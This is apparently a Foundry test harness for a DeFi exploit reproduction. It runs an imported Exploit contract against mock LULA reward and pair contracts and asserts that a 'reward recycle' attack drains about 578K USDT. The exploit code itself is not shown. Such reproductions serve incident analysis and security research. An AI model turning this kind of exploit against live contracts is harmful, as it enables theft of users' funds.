// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, LulaReward, Pair, MiniERC20} from "./2026-07-LULA.sol";

contract LULATest is Test {
    function test_exploit_rewardRecycle_drainsPair() public {
        Exploit e = new Exploit();
        e.run();
        emit log_named_decimal_uint("USDT drained from pair", e.drained(), 18);
        emit log_named_decimal_uint("attacker USDT profit", e.profit(), 18);
        assertGe(e.profit(), 578000e18, "must drain ~578K USDT");
    }
}
